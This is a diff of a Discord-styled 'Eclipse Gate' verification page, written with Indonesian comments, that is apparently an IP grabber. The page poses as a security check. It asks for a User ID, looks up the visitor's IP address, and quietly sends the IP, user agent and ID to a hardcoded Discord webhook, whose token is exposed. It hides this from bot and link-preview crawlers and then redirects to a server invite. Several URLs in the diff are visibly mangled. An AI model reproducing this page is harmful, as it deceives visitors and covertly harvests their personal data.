@@ -5,11 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Verifying...</title>
 
-  <!-- Google Fonts & Font Awesome -->
   <link rel="preconnect" href="https://googleapis.com">
   <link rel="preconnect" href="https://gstatic.com" crossorigin>
-  <link href="https://googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link href="https://googleapis.com" rel="stylesheet">
+  <link rel="stylesheet" href="https://cloudflare.com">
 
   <style>
     body {
@@ -26,7 +25,6 @@
       overflow: hidden;
     }
 
-    /* Background symbols */
     .symbols {
       position: fixed;
       top: 0;
@@ -72,12 +70,55 @@
       color: #ffffff;
     }
 
-    /* Animasi Spinner Ringan */
+    .input-container {
+      margin: 25px 0 15px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .user-input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      background: rgba(0, 0, 0, 0.3);
+      color: #fff;
+      font-family: 'Poppins', sans-serif;
+      font-size: 14px;
+      box-sizing: border-box;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    .user-input:focus {
+      border-color: #5865F2;
+      box-shadow: 0 0 8px rgba(88, 101, 242, 0.3);
+    }
+
+    .submit-button {
+      width: 100%;
+      padding: 13px;
+      border: none;
+      border-radius: 8px;
+      background: #5865F2;
+      color: #fff;
+      font-family: 'Poppins', sans-serif;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .submit-button:hover {
+      background: #4752c4;
+    }
+
     .spinner {
       width: 50px;
       height: 50px;
       border: 4px solid rgba(255, 255, 255, 0.1);
-      border-top-color: #5865F2; /* Warna khas Discord */
+      border-top-color: #5865F2;
       border-radius: 50%;
       margin: 30px auto;
       animation: spin 1s linear infinite;
@@ -86,11 +127,10 @@
       to { transform: rotate(360deg); }
     }
 
-    /* Ikon Sukses Sentuhan Baru */
     .success-icon {
       display: none;
       font-size: 55px;
-      color: #43b581; /* Warna hijau sukses Discord */
+      color: #43b581;
       margin: 25px auto;
       animation: pop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
@@ -120,19 +160,21 @@
   <div class="box">
     <h1 id="title-text">Eclipse Gate</h1>
     
-    <!-- Bagian Interaktif Verifikasi -->
-    <div id="loader" class="spinner"></div>
+    <div id="form-block" class="input-container">
+      <input type="text" id="user-id-input" placeholder="Masukkan User ID Anda..." autocomplete="off">
+      <button class="submit-button" onclick="verifyAndLog()">Verify Connection</button>
+    </div>
+
+    <div id="loader" class="spinner" style="display: none;"></div>
     <div id="success-mark" class="success-icon"><i class="fa-solid fa-circle-check"></i></div>
     
-    <p id="status-label" class="status-text">Verifying security connection...</p>
+    <p id="status-label" class="status-text">Silakan masukkan User ID untuk memulai otentikasi.</p>
   </div>
 
   <script>
-    // Konfigurasi Utama
     const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
     const discordInvite = "https://discord.gg/fMbZNhGVmh";
 
-    // Sintesis Efek Suara Robotik/Beep menggunakan Audio API Browser
     function playSuccessSound() {
         try {
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -156,36 +198,44 @@
         }
     }
 
-        async function startGate() {
+    async function verifyAndLog() {
+        const userIdField = document.getElementById('user-id-input');
+        const userIdValue = userIdField.value.trim();
+
+        if (!userIdValue) {
+            alert("Harap masukkan User ID Anda terlebih dahulu!");
+            return;
+        }
+
+        document.getElementById('form-block').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('status-label').innerText = "Verifying security connection...";
+
         let userIp = "Unknown/Blocked";
         const userAgent = navigator.userAgent;
 
-        // Skip pelacakan jika dibuka oleh bot preview internal Discord
         if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
             window.location.href = discordInvite;
             return;
         }
 
-        // PERBAIKAN: Menggunakan perintah 'await' yang valid agar browser wajib menunggu IP selesai diambil
         try {
-            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipResponse = await fetch("https://ipify.org");
             if (ipResponse.ok) {
                 const ipData = await ipResponse.json();
-                userIp = ipData.ip; // Mengunci nomor IP asli pengguna
+                userIp = ipData.ip;
             }
         } catch (e) {
             console.log("IP lookup failed or blocked by AdBlocker");
         }
 
-        // Susun payload log data setelah IP dipastikan terisi
         const now = new Date();
         const payload = {
             username: ".nael",
             avatar_url: "https://cdn.discordapp.com/avatars/1288936739561279618/47a58cb8dbd6b2179367e4f50bf4a0b8.webp?size=160",
-            content: `🛡️ **[MEMBER VERIFIED]**\n**IP:** \`${userIp}\`\n**Date:** ${now.toLocaleDateString('id-ID')}\n**Time:** ${now.toLocaleTimeString('id-ID')}\n**Device:** \`${userAgent}\``
+            content: `🛡️ **[MEMBER VERIFIED]**\n👤 **User ID:** \`${userIdValue}\`\n🌐 **IP:** \`${userIp}\`\n📅 **Date:** ${now.toLocaleDateString('id-ID')}\n⏰ **Time:** ${now.toLocaleTimeString('id-ID')}\n💻 **Device:** \`${userAgent}\``
         };
 
-        // Kirim data secara tersembunyi ke Webhook menggunakan Blob biner (Bypass CORS Discord)
         const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
         try {
             if (navigator.sendBeacon) {
@@ -197,7 +247,6 @@
             console.log("Log pushed");
         }
 
-        // --- TIMING ANIMASI TETAP SAMA (3 DETIK) ---
         setTimeout(() => {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('success-mark').style.display = 'block';
@@ -205,19 +254,14 @@
             document.getElementById('status-label').style.color = "#43b581";
             document.getElementById('title-text').innerText = "Verified!";
             
-            playSuccessSound(); // Mainkan sound effect beep sukses
+            playSuccessSound();
 
-            // Jeda 1 detik setelah bunyi (Total 4 detik), baru lempar ke Discord
             setTimeout(() => {
                 window.location.href = discordInvite;
             }, 1000);
 
         }, 3000);
     }
-
-
-    // Jalankan sistem verifikasi saat halaman selesai dimuat sempurna
-    window.onload = startGate;
   </script>
 </body>
 </html>
